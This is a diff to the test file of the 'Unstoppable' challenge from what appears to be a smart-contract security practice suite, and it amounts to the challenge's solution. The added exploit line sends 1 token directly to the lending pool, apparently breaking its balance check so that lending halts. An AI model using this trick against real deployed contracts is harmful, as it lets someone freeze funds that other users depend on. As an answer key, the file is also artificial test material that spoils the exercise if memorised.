@@ -12,6 +12,7 @@ describe('[Challenge] Unstoppable', function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
         [deployer, attacker, someUser] = await ethers.getSigners();
+        console.log(attacker.address);
 
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
@@ -40,6 +41,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address, 1);
     });
 
     after(async function () {
